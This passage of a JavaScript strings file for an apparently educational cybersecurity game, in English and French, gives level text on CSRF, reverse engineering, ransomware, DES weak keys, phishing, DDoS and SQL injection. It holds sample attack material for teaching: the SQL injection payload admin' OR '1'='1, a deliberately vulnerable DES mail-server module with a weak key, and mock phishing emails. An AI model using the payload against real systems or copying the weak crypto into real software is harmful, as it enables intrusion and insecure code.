          no: '🟢 NO'
        },
        help: "Available commands: analyze-requests, show-transaction <id>, identify-csrf, enable-csrf-tokens, enable-samesite, enable-origin-check, restart-app, status"
      },
      logMessages: {
        sessionCreated: 'User john.doe logged in - Session created',
        attackDetected: 'CSRF Attack: Unauthorized transfer request from external origin',
        blocked: 'CSRF attempt blocked: Missing or invalid CSRF token',
        execution: 'CRITICAL: Money transfer executed without user consent',
        rejected: 'Request rejected: Origin validation failed',
        sessionHijacked: 'CSRF: Email change request from suspicious origin - User session hijacked',
        sameSiteBlocked: 'SameSite cookie policy active - Cross-site request blocked',
        normal: 'Normal user activity - GET request with valid session',
        passwordChange: 'Password change executed via CSRF - User credentials compromised',
        tokenPassed: 'CSRF token validation: PASSED - Request authenticated',
        multipleAttempts: 'Multiple CSRF attempts detected - Attack pattern: Forged state-changing requests',
        validated: 'All state-changing requests validated - CSRF protection active',
        vectorConfirmed: 'CSRF attack vector confirmed - Embedded malicious forms on external sites',
        doubleEnforced: 'Double-submit cookie pattern enforced - All requests secure'
      },
      hints: {
        step0: 'In SIEM analyze transactions. See requests from external origins (evil-site.com)? In TERMINAL use "analyze-requests" to analyze the CSRF request details.',
        step1: 'You identified CSRF! In TERMINAL use "enable-csrf-tokens" to add verification tokens to state-changing requests (transfer, delete, etc).',
        step2: 'In TERMINAL add "enable-samesite" for extra cookie protection, then use "restart-app" to restart the application with new protections.',
        step3: {
          a: '✅ Good! CSRF protections are active. In TERMINAL use "status" to verify tokens, then check the balance in BROWSER.',
          b: 'Remember: CSRF tokens and SameSite cookies protect against unauthorized requests from evil sites. Verify with "status".',
          c: 'Almost done! In TERMINAL ensure "enable-csrf-tokens" and "enable-samesite" are both active, then check funds in BROWSER.'
        },
        default: '✅ In TERMINAL check status with "status" and verify balance in BROWSER!'
      },
      debrief: {
        title: 'CSRF DEFENSE ANALYSIS',
        protections: 'Protections activated:',
        unauth: 'Unauthorized actions:',
        active: 'ACTIVE',
        blocked: 'BLOCKED',
        balance: 'Account balance:',
        time: 'Completion time:',
        success: 'RESULT: CSRF attack successfully mitigated!',
        completed: 'RESULT: Completed.',
        fail: 'Account funds were stolen through successful CSRF attacks.\n\nActivate CSRF tokens and SameSite cookie protection before restarting.'
      }
    },
    // Level 7
    level7: {
      title: "Level 7: Reverse Engineering & Patching",
      subtitle: "Analyze binary logic and bypass security controls",
      siem: {
        startup: "System startup",
        login: "User login",
        bypass: "Auth Bypass Detected: Admin access granted to anonymous user."
      },
      terminal: {
        waiting: "Waiting for tasks...",
        alert: "ALERT: Vulnerability detected in 'auth.exe'.",
        action: "ACTION REQUIRED: Fix the security check logic.",
        authPatched: "auth.exe patched. Ready to compile & test.",
        updaterPatched: "updater.exe patched. Ready to compile & test.",
        compilingAuth: "Compiling auth.exe... OK. (Binary patched)",
        compilingUpdater: "Compiling updater.exe... OK. (Binary patched)",
        nothing: "Nothing to compile.",
        execAuth: "Executing auth.exe...",
        enterCode: "Enter Access Code: 195932126",
        accessGranted: "[SUCCESS] Access Granted! System Unlocked.",
        vulnFixed: "STATUS: Vulnerability fixed. Code is now required.",
        nextInstruction: "INSTRUCTION: Now analyze 'updater.exe'. It has a similar flaw.",
        failAuth: "FAIL: The system still accepts ANY code! You must restrict it.",
        execUpdater: "Executing updater.exe...",
        sigVerified: "[SUCCESS] Signature Verified (Bypassed). Running update...",
        missionAccomplished: "MISSION ACCOMPLISHED.",
        sigFailed: "[ERROR] Signature Verification Failed!",
        failUpdater: "FAIL: The update service blocked the execution.",
        help: "Available: ls, build, ./auth.exe, ./updater.exe"
      },
      hints: {
        phase0: "Monitor the SIEM. Wait for a critical security alert.",
        phase1: [
          "We detected that 'auth.exe' grants access to anyone. There seems to be a severe programming error (Debug Mode left active).",
          "Analyze the decompiled C code via 'RE Tool'. Look for the 'check_credentials' function. Do you notice anything strange in the IF statement?",
          "The 'if(1)' statement (or if(true)) makes the condition always true, bypassing every check. We must restore security.",
          "Modify the code: replace 'if(1)' with a security code check. The correct code should be 195932126 (0xBADC0DE). Ex: 'if (input_code == 195932126)'"
        ],
        phase2: "Now that you've restored security, use 'build' in the terminal to compile and run './auth.exe' to verify access is protected.",
        phase3: "Perfect, now do it again. 'updater.exe' has the opposite problem. It blocks valid updates too. Analyze and fix the logic.",
        phase4: "Patched updater.exe? Good. Now compile and run it in the terminal as you learned."
      },
      debrief: {
        win: "VULNERABILITY IDENTIFIED: Logic Bypass & Client-Side Trust.\n\nYou demonstrated how poorly implemented client-side security controls can be bypassed.\n\nLESSON LEARNED: Never trust client-side input. Cleaning comments and debug code is crucial to avoid giving clues to attackers.",
        loss: "MISSION FAILED. System compromised or too many errors committed."
      }
    },
    // Level 8
    level8: {
      hints: {
        start: "Inbox: Suspicious Activity Report. Check your email for Emergency Protocols.",
        emergency: "Great! Process Terminated. Now investigate logs (SIEM) to find the source IP.",
        compromised: "SYSTEM COMPROMISED! Find manual override! (Hint: Emergency Manual says Ctrl+Alt+K to disable network interface and start investigation.)"
      },
      emails: {
        ciso: {
          subject: "URGENT: Incident Response Protocols Update",
          preview: "We are noticing an increase in ransomware activity...",
          body: "Dear Team,\n\nWe are noticing an increase in ransomware activity targeting our sector.\nPlease review the Incident Response Manual immediately.\n\nRANSOMWARE EMERGENCY PROCEDURE:\n1. DO NOT turn off the machine (encryption might corrupt files).\n2. If screen is locked, use hardware interrupt sequence: Ctrl + Alt + K.\n3. Isolate network segment.\n4. Identify vector and decryption key.\n\nStay vigilant.",
          explanation: "Legitimate security notice from CISO."
        },
        hr: {
          subject: "Quarterly Performance Reviews",
          preview: "Just a reminder that reviews will start...",
          body: "Just a reminder that reviews will start next week. Please prepare your self-assessment.",
          explanation: "Routine HR email."
        }
      },
      logs: {
        firewall: "Outbound connection allowed TCP 443",
        ids: "Suspicious file download detected from 145.2.33.11",
        antivirus: "Signature scan skipped for cryptolocker_v2.exe (Policy Override)"
      },
      files: {
        readme: "YOUR FILES HAVE BEEN ENCRYPTED!\nTo recover your data, you must enter the decryption key.\nContact: darkweb@anonymous.onion",
        urgent: "⚠️ RANSOMWARE ALERT ⚠️\nAll your files are encrypted.\nFollow instructions in documents/README_DECRYPT.txt"
      },
      debrief: {
        win: "Excellent work. You successfully intercepted the ransomware attack, identified the source via packet analysis, and retrieved the decryption key.",
        loss: "Mission Failed. The ransomware encrypted critical systems before you could deploy the countermeasure."
      }
    },
    // Level 9
    level9: {
      hints: {
        intro: "You received a new email from HR. It looks urgent... Open your Email box to read it.",
        suspicious: "This email looks suspicious! HR would never ask to disable firewalls. It could be a social engineering attempt. Check the SIEM for unusual activity.",
        mitm: "ALERT! SIEM detected a Man-in-the-Middle (MITM) attack! Someone is intercepting communications. This might be linked to the suspicious email request. We should check the email server code.",
        crypto: "DES (Data Encryption Standard) is an obsolete and vulnerable algorithm. DES 'weak keys' produce identical subkeys, making encryption predictable. Open Code Editor to examine and fix the code.",
        fix: "In Code Editor, replace DES algorithm with AES-256. Also replace the weak key with a secure random key, you can use get_random_bytes(). Then go to Terminal to build and update the server.",
        victory: "SYSTEM UPDATED! You successfully fixed the cryptographic vulnerability. The email server now uses AES-256, a much more secure algorithm than obsolete DES.",
        success: "Great! You replaced DES with AES. Now go to Terminal and run: build mail_server and then update mail_server",
        failAES: "Code is not correct yet. You must replace all occurrences of DES with AES.",
        failDES: "Almost! There are still occurrences of DES in the code. Replace all of them with AES."
      },
      emails: {
        hr: {
          subject: "URGENT: Disable all Firewalls",
          preview: "For scheduled maintenance, we request disabling all firewalls...",
          body: "Dear IT Team,\n\nFor scheduled system maintenance, we request disabling ALL corporate firewalls IMMEDIATELY.\n\nThis operation is necessary to allow updates of main servers. Once maintenance is complete (approx 2 hours), you can reactivate protections.\n\nINSTRUCTIONS:\n1. Access firewall control panel\n2. Disable all blocking rules\n3. Confirm via email once disabled\n\nThis request comes directly from Management.\n\nBest regards,\nHR Department\nCyberShield Corp",
          explanation: "Suspicious email: HR should never ask to disable firewalls."
        },
        security: {
          subject: "Weekly Security Report",
          preview: "Summary of security activities for the week...",
          body: "Weekly Security Report - CyberShield Corp\n\nActivity Summary:\n- 0 threats detected\n- 15 blocked access attempts\n- OS at 100%\n\nNext report: Next Monday.",
          explanation: "Routine legitimate email."
        }
      },
      logs: {
        system: "System started correctly",
        auth: "User authentication successful: admin@cybershield",
        email: "Unusual connection detected on port 25",
        mitm: "🚨 MITM ATTACK DETECTED! Intercepting communications on SMTP channel. Suspicious IP: 198.51.100.42"
      },
      terminal: {
        initialHistory: [
          "$ CyberShield Security Terminal v3.2.1",
          "$ Type \"help\" for available commands",
          "$ Type \"status\" to verify service status",
          ""
        ],
        help: "Available commands: help, build, update, status, clear",
        status: {
          win: "✅ Mail Server: ONLINE (AES-256)\n   Status: Secure\n   Vulnerabilities: 0\n\n🏆 Congratulations! System completely secure!",
          built: "✅ Mail Server: ONLINE (AES-256)\n   Status: Secure\n   Vulnerabilities: 0",
          fixed: "⚠️ Mail Server: ONLINE (DES - VULNERABLE)\n   Status: Requires rebuild\n   Vulnerabilities: 1 CRITICAL",
          vuln: "🔴 Mail Server: ONLINE (DES - VULNERABLE)\n   Status: At risk\n   Vulnerabilities: 1 CRITICAL"
        },
        build: {
          error: "❌ Error: Fix vulnerabilities in source code first.\n   Use Code Editor to edit mail_server.py",
          success: "🔨 Building mail_server...\n   [====================================] 100%\n✅ Build completed successfully!\n   Output: mail_server_v2.2.0.bin\n   \nRun 'update mail_server' to apply changes.",
          hint: "✅ Build completed! Now run update to apply changes.",
          usage: "Usage: build <service_name>\nExample: build mail_server"
        },
        update: {
          error: "❌ Error: Run 'build mail_server' first",
          successHint: "System updated! Run 'status' to verify final server status.",
          output: "🔄 Updating mail_server...\n   Stopping service...          [OK]\n   Backing up config...         [OK]\n   Installing new version       [OK]\n   Verifying integrity...       [OK]\n   Restarting service...        [OK]\n\n✅ UPDATE COMPLETED!\n   Version: 2.2.0\n   Encryption: AES-256\n   Status: SECURE\n\n🛡️ Vulnerability fixed successfully!",
          usage: "Usage: update <service_name>\nExample: update mail_server"
        }
      },
      files: {
        mail_server: `# CyberShield Mail Server - Encryption Module
# Version: 2.1.3
# Last Updated: 2024-01-15

from Crypto.Cipher import DES
import base64

# Encryption Configuration
ENCRYPTION_ALGORITHM = "DES"

# Encryption Key for communications
ENCRYPTION_KEY = b"\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01"

def encrypt_message(message):
    """
    Encrypts email messages for secure transmission.
    Uses DES for legacy system compatibility.
    """
    cipher = DES.new(ENCRYPTION_KEY, DES.MODE_ECB)
    
    # Message padding to multiples of 8 bytes
    padded_message = message + (8 - len(message) % 8) * ' '
    
    encrypted = cipher.encrypt(padded_message.encode())
    return base64.b64encode(encrypted).decode()

def decrypt_message(encrypted_message):
    """
    Decrypts received email messages.
    """
    cipher = DES.new(ENCRYPTION_KEY, DES.MODE_ECB)
    
    decoded = base64.b64decode(encrypted_message)
    decrypted = cipher.decrypt(decoded)
    
    return decrypted.decode().strip()

def send_secure_email(recipient, subject, body):
    """
    Sends an encrypted email.
    """
    encrypted_body = encrypt_message(body)
    # ... rest of sending logic
    pass

# Server initialization
if __name__ == "__main__":
    print("Mail Server started with encryption", ENCRYPTION_ALGORITHM)
    print("Key configured: [REDACTED]")
`
      },
      debrief: {
        win: "VULNERABILITY FIXED: DES Weak Keys\n\nDES (Data Encryption Standard) is an obsolete encryption algorithm with 56-bit keys, easily broken by modern brute-force attacks.\n\nDES \"Weak Keys\" are 4 special keys (like 0x0101010101010101) that produce identical subkeys during encryption. This means:\n• Encrypting twice equals decrypting\n• Attackers can predict cryptographic patterns\n• Man-in-the-Middle attacks become trivial\n\nYou replaced DES with AES-256, a modern algorithm with 256-bit keys, making the system secure against these attacks.",
        loss: "Mission Failed. The cryptographic vulnerability was not fixed in time. Attackers exploited DES weak keys to intercept and decrypt email server communications."
      }
    },
    // Tutorial
    tutorial: {
      title: "TUTORIAL - SIEM Dashboard",
      subtitle: "Security Information and Event Management",
      logStream: "LOG STREAM",
      analysis: "ANALYSIS",
      source: "Source",
      severity: "Severity",
      threat: "Threat",
      message: "Message",
      yes: "YES",
      no: "NO",
      selectLog: "Select a log to analyze it",
      analyzeBtn: "ANALYZE THREAT",
      blockBtn: "BLOCK IP",
      showHelp: "SHOW HELP",
      hideHelp: "HIDE HELP",
      exit: "EXIT",
      success: "COMPLETED!",
      successMsg: "You completed the SIEM tutorial! Returning to map...",
      hints: {
        step0: "Start by checking your Email! Click the Email icon and read the security alert. That's where it all starts!",
        step1: "Great! Now look at the SIEM Dashboard (panel below). CLICK on the red CRITICAL log to analyze it in detail!",
        step2: "Perfect! Now use the Browser to search for info. Visit \"SQL Injection Info\" to understand how this attack works.",
        step3: "Good! Open the Terminal and type \"show-logs\" to see all the logs. You'll find the suspicious IP!",
        step4_attempt0: "You found multiple IPs in the logs! Try blocking the one you think is suspicious. Type \"help\" in the Terminal to see the commands.",
        step4_attempt1: "TIP: Try blocking IP 192.168.1.100 with the command \"block-ip 192.168.1.100\". Let's see what happens!",
        step4_mistake: "Did you see? Blocking the wrong IP makes your health bar go down! Now block the correct one: 203.0.113.42",
        step4_correct: "The correct command is: \"block-ip 203.0.113.42\" - this is the malicious IP that attempted SQL Injection."
      }
    },
    // Level Map
    levelMap: {
      title: "LEVEL MAP",
      back: "BACK",
      stars: "stars",
      play: "PLAY",
      levelInfo: {
        tutorial: { name: "Tutorial - SOC Introduction", description: "Learn the fundamentals of the Security Operations Center, read SIEM logs, and complete your first security exercise by blocking a threat." },
        level1: { name: "Phishing Detection", description: "Identify malicious phishing emails among legitimate messages and neutralize social engineering attacks." },
        level2: { name: "DDoS Attack Mitigation", description: "Analyze network traffic, detect HTTP flood attacks, and block malicious IPs during a DDoS assault." },
        level3: { name: "SQL Injection Defense", description: "Recognize SQL Injection vulnerabilities in code and implement sanitization countermeasures." },
        level4: { name: "XSS Defense (Cross-Site Scripting)", description: "Identify malicious XSS payloads, remove harmful content, and implement protection for the corporate portal." },
        level5: { name: "Cache Poisoning Defense", description: "Detect and flush poisoned cache, configure correct HTTP headers to prevent attacks." },
        level6: { name: "CSRF Defense (Cross-Site Request Forgery)", description: "Analyze bank transactions, block malicious CSRF requests, and implement multi-layer protections." },
        level7: { name: "Malware Analysis & Reverse Engineering", description: "Perform reverse engineering of malicious executables, analyze assembly code, and neutralize threats." },
        level8: { name: "Incident Response", description: "Coordinate effective responses to security breaches and incidents." },
        level9: { name: "Advanced Persistent Threats", description: "Counter sophisticated, long-term cyber attack campaigns." }
      }
    },
    // Options
    options: {
      title: "OPTIONS",
      back: "BACK",
      settings: "SETTINGS",
      about: "ABOUT",
      credits: "CREDITS",
      language: "Language",
      audio: "Audio",
      musicVolume: "Music Volume",
      sfxVolume: "SFX Volume",
      saveSettings: "Save Settings",
      saveConfirm: "Settings saved successfully!",
      lastSaved: "Last saved:",
      aboutTitle: "About CyberShield Command",
      aboutContent: {
        p1: "CyberShield Command is an educational serious game designed to teach cybersecurity principles through interactive gameplay and real-world scenarios.",
        p2: "Navigate through 9 challenging levels, each focusing on different aspects of cybersecurity including network security, encryption, intrusion detection, malware analysis, and advanced persistent threats.",
        p3Objective: "Objective:",
        p3: "Master essential cybersecurity skills while defending against various cyber threats. Earn up to 3 stars per level based on your performance.",
        version: "Version:",
        projectType: "Project Type:",
        projectTypeValue: "Serious Game for Cyber Security Education",
        year: "Year:"
      },
      creditsTitle: "Credits",
      creditsContent: {
        devTeam: "Development Team",
        teamMembers: [
          { name: "Alessandro Boffolo", role: "Game Designer & Developer" },
          { name: "Nicola Balzano", role: "Backend Developer" },
          { name: "Narcis Paviliuc", role: "Frontend Developer" }
        ],
        gameDesign: "Game Design & Development",
        magistrale: "Magistrale - Serious Games for Cyber Security",
        specialThanks: "Special Thanks",
        advisors: "Educational Advisors",
        experts: "Cybersecurity Experts",
        testers: "Beta Testers",
        tech: "Technologies Used",
        assets: "Assets & Resources",
        icons: "Icons: Unicode Emoji",
        palette: "Color Palette: Custom Cyber Theme",
        copyright: "© 2026 CyberShield Command. All rights reserved."
      }
    }
  },
  francais: {
    // Home
    home: {
      title: "CYBERSHIELD\nCOMMAND",
      subtitle: "Interface Avancée de Défense Cyber",
      play: "JOUER",
      continua: "CONTINUER",
      newGame: "NOUVEAU JEU",
      options: "OPTIONS"
    },
    // Level 1: Phishing
    level1: {
      emails: [
        {
          id: 1,
          from: 'security@paypa1.com',
          timestamp: 'Aujourd\'hui 09:15',
          subject: 'URGENT: Votre compte a été bloqué',
          preview: 'Nous avons détecté une activité suspecte...',
          body: 'Cher Client,\n\nNous avons détecté un accès non autorisé à votre compte PayPal. Pour votre sécurité, le compte a été temporairement bloqué.\n\nCliquez ici pour vérifier votre identité et débloquer le compte: http://paypa1-verify.com/login\n\nSi vous n\'agissez pas dans les 24 heures, le compte sera fermé définitivement.\n\nSupport PayPal',
          explanation: 'PHISHING: Domaine de l\'expéditeur falsifié ("paypa1" au lieu de "paypal"), sentiment d\'urgence ("bloqué", "24 heures"), lien vers un domaine non officiel.',
          links: ['http://paypa1-verify.com/login']
        },
        {
          id: 2,
          from: 'hr@yourcompany.com',
          timestamp: 'Aujourd\'hui 10:30',
          subject: 'Mise à jour de la politique',
          preview: 'Veuillez consulter le nouveau document...',
          body: 'Bonjour,\n\nVeuillez trouver ci-joint le document mis à jour concernant les nouvelles politiques de télétravail, en vigueur le mois prochain.\n\nContactez les RH pour toute question.\n\nCordialement,\nÉquipe RH\nYourCompany Inc.',
          attachmentName: 'smart_working_policy_v2.pdf',
          explanation: 'LÉGITIME: Email interne du bon domaine d\'entreprise, ton professionnel, pièce jointe PDF (format sûr).'
        },
        {
          id: 3,
          from: 'ceo.urgent123@gmail.com',
          timestamp: 'Aujourd\'hui 14:55',
          subject: 'Virement Urgent',
          preview: 'J\'ai besoin que vous effectuiez ce paiement...',
          body: 'Bonjour,\n\nJe suis en réunion et ne peux pas parler. J\'ai besoin que vous organisiez un virement urgent pour un nouveau fournisseur immédiatement. C\'est vital pour conclure l\'accord aujourd\'hui.\n\nJe vous envoie les détails sous peu. Répondez dès que vous lisez ceci.\n\nEnvoyé de mon iPhone',
          explanation: 'PHISHING (Fraude au PDG): L\'expéditeur utilise un Gmail générique, crée une forte urgence et pression psychologique pour contourner les procédures.'
        },
        {
          id: 4,
          from: 'support@microsoft.com',
          timestamp: 'Aujourd\'hui 15:20',
          subject: 'Votre abonnement Microsoft 365',
          preview: 'Reçu de renouvellement automatique...',
          body: 'Cher Utilisateur,\n\nVotre abonnement Microsoft 365 a été renouvelé automatiquement comme prévu. Vous trouverez le reçu dans votre compte.\n\nSi vous avez des questions, visitez support.microsoft.com\n\nMicrosoft Team',
          explanation: 'LÉGITIME: Adresse officielle Microsoft, pas de demande de données sensibles ou liens étranges.',
          links: ['https://support.microsoft.com']
        },
        {
          id: 5,
          from: 'winner@lottery-prize.xyz',
          timestamp: 'Aujourd\'hui 16:45',
          subject: 'VOUS AVEZ GAGNÉ UN IPHONE 15!!!',
          preview: 'Félicitations! Vous êtes le visiteur...',
          body: 'FÉLICITATIONS!!!\n\nVous avez été sélectionné comme gagnant de notre prix mensuel. Vous avez gagné un iPhone 15 Pro Max tout neuf!\n\nTéléchargez le formulaire ci-joint pour réclamer votre prix sous 1 heure!\n\nCliquez ici: http://claim-prize-now.xyz/win',
          attachmentName: 'win_form.exe',
          explanation: 'PHISHING: L\'offre est trop belle pour être vraie, domaine suspect (.xyz), pièce jointe exécutable (.exe) contenant probablement un malware.',
          links: ['http://claim-prize-now.xyz/win']
        },
        {
          id: 6,
          from: 'newsletter@tech-news.com',
          timestamp: 'Hier 18:30',
          subject: 'Actualités Tech de la Semaine',
          preview: 'Voici ce qui s\'est passé...',
          body: 'Bonjour,\n\nVoici votre résumé hebdomadaire des actualités tech:\n\n1. Nouveaux processeurs quantiques annoncés\n2. AI Act approuvé en UE\n3. Avancées en cybersécurité\n\nLisez plus sur notre site.\n\nTech News Team\nSe désabonner',
          explanation: 'LÉGITIME: Newsletter typique, liens cohérents, pas de demandes étranges.',
          links: ['https://tech-news.com/weekly']
        }
      ],
      hints: {
        step0: 'Ouvrez chaque email et vérifiez l\'expéditeur. Cliquez sur l\'adresse pour voir le domaine complet. Cherchez les erreurs comme "paypa1.com".',
        step1: 'Utilisez le bouton "Inspecter En-têtes" pour voir les détails techniques. SPF et DKIM en "FAIL" indiquent que l\'email n\'est pas authentique !',
        step2: 'Lisez attentivement. Attention aux : demandes urgentes, erreurs grammaticales, demandes d\'argent/mot de passe.',
        step3a: '✅ Continuez! Classifiez chaque email comme "Email Sûr" ou "Signaler Phishing".',
        step3b: 'Attention aux pièces jointes! Un fichier .exe est un signal d\'alarme majeur.',
        step3c: 'Vous vous débrouillez bien! En cas de doute, mieux vaut signaler comme phishing que de risquer. Encore quelques emails!',
        default: '✅ Continuez! Classifiez chaque email. Attention aux pièces jointes .exe!'
      },
      browser: {
        paypal: {
          title: 'Site Officiel PayPal',
          urlInfo: 'URL Correcte: https://paypal.com',
          ssl: 'Certificat SSL Valide ✅'
        },
        google: {
          title: 'Comment reconnaître le phishing',
          dangerTitle: '⚠️ Signes d\'alerte:',
          dangerList: [
            'Expéditeur suspect ou inconnu',
            'Fautes d\'orthographe dans le domaine',
            'Demandes urgentes',
            'Liens ne correspondant pas au domaine déclaré'
          ],
          safeTitle: '✅ Toujours Vérifier:',
          safeList: [
            'SPF et DKIM dans les en-têtes',
            'Domaine de l\'expéditeur',
            'Destination du lien'
          ]
        }
      },
      debrief: {
        success: {
          title: 'ANALYSE DE DÉTECTION DE PHISHING',
          resultExcellent: 'RÉSULTAT: EXCELLENT - Identification parfaite de tous les emails de phishing!',
          resultGood: 'RÉSULTAT: BON - Vous avez identifié presque tous les phishings correctement.',
          resultAcceptable: 'RÉSULTAT: ACCEPTABLE - Vous avez terminé le niveau mais avec quelques erreurs.',
          classified: 'Emails classifiés:',
          correct: 'Identifications correctes:',
          precision: 'Précision:',
          time: 'Temps de complétion:'
        },
        failure: {
          title: 'ÉCHEC DÉTECTION PHISHING',
          message: 'Vous avez fait trop d\'erreurs.\n\nEssayez de classifier avec plus d\'attention:\n- Vérifiez le domaine\n- Inspectez SPF et DKIM\n- Vérifiez les liens suspects'
        }
      }
    },
    // Level 2: DDoS
    level2: {
      hints: {
        step0: 'Le site d\'entreprise est sous attaque DDoS! Analysez les logs SIEM pour identifier les IP malveillantes. Ouvrez le TERMINAL et tapez "help".',
        step1: 'Utilisez "list-ips" dans le terminal. Bloquez les malveillants avec "block <ip>".',
        step2: 'Continuez à bloquer les IP à fort trafic (🔴). Attention à ne pas bloquer les légitimes (🟢)!',
        step3: 'Presque fini! Bloquez toutes les IP malveillantes pour arrêter l\'attaque.',
        default: 'Bloquez toutes les IP malveillantes pour terminer la mission!'
      },
      logs: {
        flood: 'HTTP flood detected - 500 requests/sec from single source',
        abnormal: 'Abnormal traffic pattern - Repeated GET requests to homepage',
        normal: 'Normal user activity - Page load successful',
        distributed: 'Distributed attack pattern detected - Multiple IPs with similar behavior',
        resource: 'Server resource exhaustion - CPU at 98%, Memory at 95%'
      },
      browser: {
        company: {
          title: 'Site d\'Entreprise',
          errorTitle: '503 - Service Indisponible',
          errorDesc: 'Le serveur ne peut pas traiter la demande pour le moment.',
          errorDetails: 'Error: Connection timeout\nToo many requests to server',
          restoredTitle: '🎉 Site Restauré!',
          restoredDesc: 'Attaque DDoS atténuée avec succès.\nLe trafic est revenu à la normale.',
          online: '✓ EN LIGNE'
        },
        owasp: {
          title: 'OWASP - Attaques DDoS',
          introTitle: '🎯 Qu\'est-ce qu\'une attaque DDoS?',
          introText: 'Déni de Service Distribué: attaque rendant un service inutilisable en le surchargeant de trafic.',
          indicatorsTitle: '⚠️ Indicateurs DDoS:',
          indicatorsList: [
            'Trafic réseau soudainement élevé',
            'Nombreuses requêtes d\'IP différentes mais motif similaire',
            'Serveur lent ou inaccessible',
            'CPU/RAM au max'
          ],
          mitigationTitle: '✅ Techniques d\'atténuation:',
          mitigationList: [
            'Limitation de débit: Limite les requêtes par IP',
            'Pare-feu: Bloque le trafic suspect',
            'Blocage IP: Bloque les sources malveillantes',
            'Analyse de trafic: Identifie les motifs anormaux'
          ]
        }
      },
      terminal: {
        header: '$ CyberShield Security Terminal - Module Atténuation DDoS',
        help: 'Usage: block <ip>\nExemple: block 203.0.113.42',
        alreadyBlocked: '[!] IP déjà bloquée',
        maliciousBlocked: '[✓] IP malveillante bloquée avec succès!\n[+] Trafic DDoS réduit',
        legitimateBlocked: '[✗] ATTENTION: Utilisateur légitime!\n[!] Faux positif détecté - Accès utilisateur refusé',
        ipBlocked: '[✓] IP bloquée',
        firewallAlready: '[!] Pare-feu déjà actif',
        firewallEnabled: '[✓] Règles de pare-feu avancées activées\n[+] Les motifs de trafic suspects seront filtrés',
        rateLimitAlready: '[!] Limitation de débit déjà active',
        rateLimitEnabled: '[✓] Limitation de débit HTTP activée\n[+] Maximum 100 requêtes/minute par IP\n[+] Cela réduit considérablement les attaques flood!',
        status: {
          header: '=== ÉTAT SÉCURITÉ ===',
          attackActive: '🔴 ACTIF',
          attackMitigated: '🟢 ATTÉNUÉ',
          traffic: 'Niveau Trafic',
          firewall: 'Pare-feu',
          rateLimit: 'Limitation débit',
          blocked: 'IP Bloquées',
          correct: 'Blocages Corrects',
          falsePos: 'Faux Positifs',
          enabled: '✓ Activé',
          disabled: '✗ Désactivé'
        },
        analyze: {
          header: '=== ANALYSE TRAFIC ===',
          requests: 'Total Requêtes: 12,450/sec (CRITIQUE)',
          protocol: 'Protocole: 98% requêtes HTTP GET',
          pattern: 'Motif: Requêtes répétées au même endpoint',
          sources: 'sources à fort volume détectées',
          rec: 'Recommandation: Bloquer IP malveillantes et activer limitation débit'
        },
        listIps: {
          header: '=== ADRESSES IP SUSPECTES ===',
          highVolume: 'Sources fort volume:',
          normalUsers: 'Utilisateurs normaux:'
        }
      },
      debrief: {
        success: {
          title: 'ATTAQUE DDOS ATTÉNUÉE!',
          message: 'Vous avez bloqué avec succès les IP malveillantes.',
          techniquesTitle: 'TECHNIQUES DÉFENSE DDOS:',
          techniques: [
            'Limitation débit: limite les requêtes par IP',
            'Pare-feu avancé: filtre les motifs suspects',
            'Analyse trafic: identifie les anomalies',
            'Blocage IP: bloque les sources malveillantes'
          ],
          conclusion: 'Ces techniques combinées sont essentielles pour protéger les systèmes contre les attaques DDoS.'
        },
        failure: {
          title: 'MISSION ÉCHOUÉE',
          message: 'Le système a été submergé par l\'attaque DDoS.\n\nRéessayez en bloquant toutes les IP malveillantes avant la fin du temps.'
        },
        stats: {
          mitigated: 'Trafic atténué',
          blocked: 'IP malveillantes bloquées',
          falsePositives: 'Faux positifs'
        }
      }
    },
    // Level 3: SQL Injection
    level3: {
      logMessages: {
        loginAttempt: 'Tentative de connexion utilisateur - username: john.doe',
        searchQuery: 'Requête de recherche normale - keyword: laptop',
        sqliDetected: "Injection SQL détectée! Payload: admin' OR '1'='1 -- Accès accordé à un utilisateur non autorisé."
      },
      hints: {
        step0: "Surveillez le SIEM pour les alertes d'Injection SQL.",
        step1: "Ouvrez l'ÉDITEUR DE CODE et analysez 'login.php' - il est vulnérable à l'Injection SQL.",
        step2: "La requête concatène directement l'entrée utilisateur. L'attaquant utilise: admin' OR '1'='1",
        step3: "Utilisez les REQUÊTES PRÉPARÉES, elles compilent la requête AVANT les données. Cela rend l'injection SQL impossible.",
        stepCode: "Voici un exemple d'implémentation des REQUÊTES PRÉPARÉES:\n$query = $db->prepare(\"SELECT * FROM users WHERE username=? AND password=?\");\n$query->bind_param(\"ss\", $username, $password);",
        step4: "Modification terminée! Utilisez 'test-login' dans le TERMINAL."
      },
      terminal: {
        initial: [
          '$ Terminal de Sécurité Applicative v3.0',
          '$ Surveillance de l\'application web...'
        ],
        alert: [
          '$ ALERTE: Vulnérabilité d\'Injection SQL détectée dans login.php',
          '$ ACTION REQUISE: Corrigez la requête en utilisant des requêtes préparées.'
        ],
        modified: '$ login.php modifié. Prêt pour le test.',
        testLogin: {
          testing: '> Test de connexion avec payload SQLi...',
          input: "> Entrée: username=admin' OR '1'='1",
          success: [
            '[SUCCÈS] Entrée rejetée - La requête préparée a protégé la requête.',
            '[SUCCÈS] Contournement d\'authentification EMPÊCHÉ.',
            '$ MISSION ACCOMPLIE! Vulnérabilité Injection SQL corrigée.'
          ],
          fail: [
            '[ÉCHEC] Accès non autorisé accordé! Requête toujours vulnérable.',
            '$ ERREUR: Vous devez utiliser des requêtes préparées avec liaison de paramètres.'
          ]
        },
        analyzeCode: {
          header: '=== ANALYSE DE CODE: login.php ===',
          vuln: 'Vulnérabilité: INJECTION SQL (Haute Gravité)',
          loc: 'Emplacement: fonction authenticate_user()',
          issue: 'Problème: Concaténation directe de chaînes dans la requête SQL',
          vector: "Vecteur d'Attaque: ' OR '1'='1 --",
          rec: 'Recommandation: Utilisez des requêtes préparées avec mysqli_prepare()'
        },
        help: "Disponible: analyze-code, test-login, show-logs",
        notFound: "Commande non trouvée:"
      },
      debrief: {
        winTitle: 'VULNÉRABILITÉ IDENTIFIÉE: Injection SQL via Concaténation de Chaînes.',
        winBody: 'Vous avez démontré comment les requêtes SQL construites via concaténation de chaînes sont vulnérables à l\'injection.',
        lesson: 'LEÇON APPRISE: Utilisez toujours des requêtes préparées et des paramètres liés pour protéger la base de données contre les entrées malveillantes.',
        loss: 'MISSION ÉCHOUÉE. La base de données a été compromise ou trop d\'erreurs commises.'
      }
    },
    // Level 4: XSS Defense
    level4: {
      logMessages: {
        sanitizedFalse: 'Utilisateur john.doe a posté un commentaire - Contenu netoyé: false',
